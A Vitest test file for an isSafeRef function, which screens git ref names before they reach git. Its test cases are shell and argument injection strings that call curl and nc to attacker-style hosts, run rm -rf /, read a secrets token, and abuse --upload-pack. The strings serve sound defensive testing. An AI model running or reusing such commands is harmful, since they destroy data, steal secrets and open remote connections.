import { describe, it, expect } from 'vitest';
import { isSafeRef } from '../../src/github/workspace.js';

describe('ref names we are willing to hand to git', () => {
  it('accepts the ones releases actually use', () => {
    for (const ref of ['v1', 'v2.0.0', 'v1.0.0-rc.1', 'release/2026-08', 'main', '1.2.3+build.4'.replace('+', '-')]) {
      expect(isSafeRef(ref), ref).toBe(true);
    }
  });

  it('rejects every shell metacharacter git would otherwise allow in a tag', () => {
    // git-check-ref-format forbids spaces, ~, ^, :, ?, *, [ — and permits
    // ; $ ( ) & | , every one of which is a shell metacharacter. A tag is
    // named by whoever pushes it.
    const attacks = [
      'v1;curl evil.sh|sh',
      'v1$(whoami)',
      'v1`id`',
      'v1&&rm -rf /',
      'v1|nc attacker 1234',
      'v1 --output=/etc/passwd',
      '$(cat /run/secrets/token)',
      'v1\nrm -rf /',
    ];
    for (const ref of attacks) expect(isSafeRef(ref), ref).toBe(false);
  });

  it('rejects a leading dash, which git reads as an option', () => {
    expect(isSafeRef('--upload-pack=touch /tmp/pwned')).toBe(false);
    expect(isSafeRef('-v1')).toBe(false);
  });

  it('rejects .. so a caller cannot smuggle a second range in', () => {
    expect(isSafeRef('v1..v2')).toBe(false);
  });

  it('rejects the empty string and anything absurdly long', () => {
    expect(isSafeRef('')).toBe(false);
    expect(isSafeRef('v'.repeat(300))).toBe(false);
  });
});
